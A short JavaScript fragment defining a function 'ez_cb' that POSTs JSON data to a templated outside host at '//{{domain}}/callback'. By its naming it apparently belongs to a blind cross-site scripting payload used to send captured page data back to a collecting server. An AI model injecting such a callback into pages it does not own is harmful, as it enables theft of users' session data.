...
function ez_cb(e,c=null){var t=new XMLHttpRequest();t.open('POST','//{{domain}}/callback',true);t.setRequestHeader('Content-type','text/plain');t.onreadystatechange=function(){if(t.readyState===4&&t.status===200&&c!==null){c(t.responseText);}};t.send(JSON.stringify(e));}
